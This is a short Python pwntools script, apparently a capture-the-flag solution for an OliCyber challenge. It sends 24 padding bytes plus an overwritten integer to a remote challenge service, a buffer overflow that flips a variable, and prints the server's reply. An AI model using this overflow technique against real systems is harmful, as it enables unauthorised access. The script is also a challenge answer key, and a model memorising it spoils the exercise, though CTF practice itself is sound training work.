from pwn import *

r = remote("gtn.challs.olicyber.it", 10022)
r.recv(512)

r.sendline(b"A" * 24 + b"\x01\x00\x00\x00")
r.recv(100)
r.sendline(b"1")

print(r.recv(512).decode())